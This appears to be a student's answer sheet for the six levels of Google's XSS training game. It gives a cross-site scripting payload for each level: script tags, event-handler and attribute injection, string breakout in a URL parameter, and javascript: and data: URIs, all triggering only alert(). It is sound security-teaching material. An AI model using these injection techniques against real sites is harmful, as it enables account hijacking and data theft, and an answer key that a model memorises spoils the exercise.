# Project 2: XSS Google Challenge

## Kevin Jackson

### Level 1 Answer

Insert the following code into the text box and press enter:

```html
<script> alert('XSS') </script>
```

### Level 2 Answer

Insert the following code into the message box and press enter:

```html
<img src="http://example.com" onerror="javascript:alert(1)"/>
```

### Level 3 Answer

Insert the following code into the search bar and press enter:

```html
https://xss-game.appspot.com/level3/frame#1' onerror='alert(1)';
```
### Level 4 Answer

Insert the following code into the search bar and press enter:

```html
https://xss-game.appspot.com/level4/frame?timer=')%3Balert(1)%3Bvar b=('
```

### Level 5 Answer

Insert the following code into the search bar and press enter. After that press next:

```html
https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert("XSS")
```


### Level 6 Answer

Insert the following code into the search bar and press enter:

```html
https://xss-game.appspot.com/level6/frame#data:text/javascript,alert('XSS')
```
